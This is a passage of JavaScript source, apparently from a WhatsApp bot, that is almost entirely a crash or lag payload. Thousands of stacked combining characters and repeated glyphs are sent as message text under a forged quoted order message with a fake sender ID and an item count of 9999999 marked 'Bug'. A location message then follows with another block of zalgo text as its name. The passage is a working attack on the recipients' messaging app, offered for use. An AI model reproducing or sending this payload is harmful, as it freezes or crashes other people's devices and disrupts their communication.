๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicX🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `kurzxd`,
    orderTitle: `combine`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
kurzxd.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/logobot.jpg')
                     kurzxd.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: '🔥kurzxd     ̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̘͇͙̟̫͎͎̹̹̍̐̿̈́̈́͊͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏